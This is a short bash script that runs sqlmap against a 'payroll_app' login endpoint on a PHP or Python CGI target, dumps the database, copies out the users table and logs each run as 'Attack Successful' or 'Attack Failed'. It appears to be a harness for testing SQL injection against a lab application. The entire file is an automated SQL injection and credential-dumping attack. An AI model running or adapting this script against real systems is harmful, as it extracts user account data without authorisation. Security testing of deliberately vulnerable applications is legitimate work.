TARGET=$1
DATABASE=$2
SERVER=$3

if [ $SERVER == "php" ]
then 
	sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dbms=$DATABASE --dump 
	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/
	FILE=~/users.csv
	if test -f "$FILE"
	then
		echo "$(date)   -->    $DATABASE, PHP  -->   Attack Successful" >> ~/attack-log.txt
	else
		echo "$(date)   -->    $DATABASE, PHP  -->   Attack Failed" >> ~/attack-log.txt
	fi
	rm ~/users.csv
elif [ $SERVER == "python" ]
then
	sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --dbms=$DATABASE --dump 
	FILE=~/users.csv
	mv ~/.sqlmap/output/$TARGET/dump/public/users.csv ~/ 
	if test -f "$FILE"
	then
		echo "$(date)   -->    $DATABASE, Python  -->   Attack Successful" >> ~/attack-log.txt
	else
		echo "$(date)   -->    $DATABASE, Python  -->   Attack Failed" >> ~/attack-log.txt
	fi
	rm ~/users.csv
else
	echo "Not valid."
fi

